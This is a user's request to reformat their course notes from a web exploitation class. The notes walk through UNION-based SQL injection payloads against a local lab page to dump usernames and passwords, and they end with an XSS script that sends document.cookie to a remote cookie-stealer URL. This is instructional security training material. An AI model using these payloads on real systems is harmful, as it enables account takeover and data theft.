Can you help fix, refomat, organize this read.md file so its more comprehensible:
# 🗓️ 4/8/2026 - Web Exploitation — Day 2

## Lesson Outcome:

### 1. Describe what SQL is
`SQL (Structured Query Language)` is the standard programming language used to communicate with, manage, and manipulate data stored in `relational DB`
- Relational DB: A digital DB based on the relational model of data, which organizes information into tables with `rows (records)` and `columns (attributes)`

### 2. Explain how SQL injection can be used to exploit a database
a

### 3. Perform basic SQL injection, to exploit a database
a

SQL injection - Injecting your statement: `' OR 1='1`
- Server-Side query executed would appear like: `SELECT id FROM user WHERE name='tom' OR 1=1;`

# Steps to SQL Injection GET & POST
# POST Method
### 1. Find the vulnerable option:
```sql
Audi 'OR 1 ='1
```
### 2. Determine the # of columns on our query (MOST Important):
```sql
`Audi 'Union select 1,2,3,4,5 #`
```
- Column 2 is our hidden value

### 3. (GLDEN statement):
```sql
`Audi' UNION SELECT 1,2,table_schema,table_name,column_name FROM information_schema.columns; #`
```
- Sytax structure
    - `1,2`: To maintain syntaxtical structure (placeholders)
    - `table_schema,table_schema,column_name`: Names of columns
    - `information_schema.columns`: `[DB].[table]` 

### 4. Query the info we found:
```sql
 -- 1,2 are just to meet the requirements of step 2 (column rule - placeholder)
Audi' UNION SELECT studentID,2,username,passwd,jump FROM session.userinfo; #`
```
```sql
 -- Syntax structure
[Vulnerable option]' UNION SELECT [column],[column],[column] FROM [DB].[Table]; #`
```
- `#`: Means ignore the rest after that

### SQl version POST Method
```sql
Audi' UNION SELECT @@version,database(),3,name,size FROM session.Tires; #`
```

# GET Method (Same step names diff syntax - based on feild)
- Just edit the URL itself
1. a
```sql
?Selection=2 or 1=1
```
- Change the `URL`
- `http://127.0.0.1:1237/uniondemo.php?Selection=2 or 1=1`

2. a
```sql
?Selection=2 Union SELECT 1,3,2 #
```
- `http://127.0.0.1:1237/uniondemo.php?Selection=2 Union SELECT 1,3,2 #`

3. a
```sql
?Selection=2 Union SELECT table_schema,column_name,table_name FROM information_schema.columns #
```

4. a
```sql
?Selection=2 Union SELECT studentID,passwd,username FROM session.userinfo #
```
### SQl version GET Method
```sql
?Selection=2 Union SELECT @@version,passwd,username FROM session.userinfo #
```

```js
// \b ensures the string starts and ends where the "word" actually ends
const pattern = /\b\w{20}\b/g; 

const matches = document.body.innerText.match(pattern);

console.log(matches)

```

 <script>document.location="http://10.50.158.143/Cookie_Stealer1.php?username=" + document.cookie;</script>

 Now based on the material help me streamline and verify my notes so that it is more comprehensible